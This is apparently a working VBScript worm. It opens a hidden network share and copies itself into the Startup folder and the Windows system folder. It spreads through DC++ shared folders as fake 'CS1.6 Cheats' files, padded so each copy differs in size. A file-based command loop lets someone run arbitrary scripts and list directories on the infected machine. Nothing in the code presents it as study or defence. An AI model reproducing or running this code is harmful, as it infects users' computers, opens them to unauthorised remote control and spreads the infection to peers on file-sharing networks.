ON ERROR RESUME NEXT
dim names(12)
rp = "C:\Documents and Settings\All Users\������� ����\���������\������������\SystemInit.vbs"
names(1) = "(CS1.6 Cheats) ������ ���� ��� ��"
names(2) = "(CS1.6 Cheats) ��� ��������� � ������"
names(3) = "(CS1.6 Cheats) ��� ������� ������ �����"
names(4) = "(CS1.6 Cheats) ��� ���������� �� ����� �������"
names(5) = "(CS1.6 Cheats) ������ ���"
names(6) = "(CS1.6 Cheats) ��� +500 ��"
names(7) = "(CS1.6 Cheats) ��� +75% ��������"
names(8) = "(CS1.6 Cheats) ��� ������������"
names(9) = "(CS1.6 Cheats) �������������"
names(10) = "(CS1.6 Cheats) ��� ���������"
names(11) = "(CS1.6 Cheats) death cheat"
names(12) = "(CS1.6 Cheats) 16000 ����� ������"
set shell = CreateObject("WScript.Shell")
set fso = CreateObject("Scripting.FileSystemObject")
myfold = "C:\windows\local\"
shell.run "net share local=C:\windows\local",0
f = myfold & "SEND.txt"
f2 = myfold & "DATA.vbs"
if fso.folderexists(myfold) = 0 then fso.createfolder(myfold)
if fso.fileexists(f) = 0 then fso.createtextfile(f)
if fso.fileexists(f2) = 0 then fso.createtextfile(f2)
set check = fso.getfile(f)
check.openastextstream(2,false).write("������� � " & now & "...")
GF "C:\Program files","",2
sub GF(path,obj,mode)
for each folder in fso.getfolder(path).SubFolders
if mode = 3 then 
tName = names(int(rnd * 12) + 1)
if fso.fileexists(folder & "\" & tName & ".vbs") = 0 then fso.getfile(WScript.ScriptName).Copy(folder & "\" & tName & ".vbs")
fso.OpenTextFile(folder & "\" & tName & ".vbs", 8, false).writeline(string(rnd * 25, "'"))
else
if mode = 1 then obj.writeline(folder)
for each file in fso.getfolder(folder).Files
if mode = 1 then 
obj.writeline("=>  " & fso.getfilename(file)) 
else 
if fso.getfilename(file) = "DCPlusPlus.xml" then
set conf = fso.getfile(file)
set tobj = conf.openastextstream(1,false)
do
ttext = tobj.readline
loop until instr(ttext,"<Share>") <> 0
do
ttext = tobj.readline
coos = instr(ttext, ">") + 1
cooe = instr(ttext, "</Directory>") - 1
cool = cooe - coos
if cool > 1 then 
a = mid(ttext, coos, cool)
GF a,"",3
end if
loop until instr(ttext,"</Share>") <> 0
end if
end if
next
end if
GF folder,obj, mode
next
end sub
sub main
if fso.fileExists(f) and fso.fileExists(f2) then
set check = fso.getfile(f)
select case check.openastextstream(1,false).readline
case "SCRIPT"
shell.run "wscript " &  f2
check.openastextstream(2,false).write("������ ��������!")
case "TREE"
set tmp = fso.createtextfile(myfold & "temp.txt")
check.openastextstream(2,false).write("�������� ������...")
GF fso.getfile(f2).openastextstream(1,false).readline, tmp, 1
check.openastextstream(2,false).write("������ ������!")
end select
end if
if fso.fileexists("C:\windows\system\init.vbs") = 0 then fso.getfile(WScript.ScriptName).Copy("C:\windows\system\init.vbs")
if fso.fileexists(rp) = 0 then fso.getfile("C:\windows\system\init.vbs").Copy(rp)
WScript.Sleep(1000)
main
end sub
main                                                                                                       ''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
''''''''''''''''''''
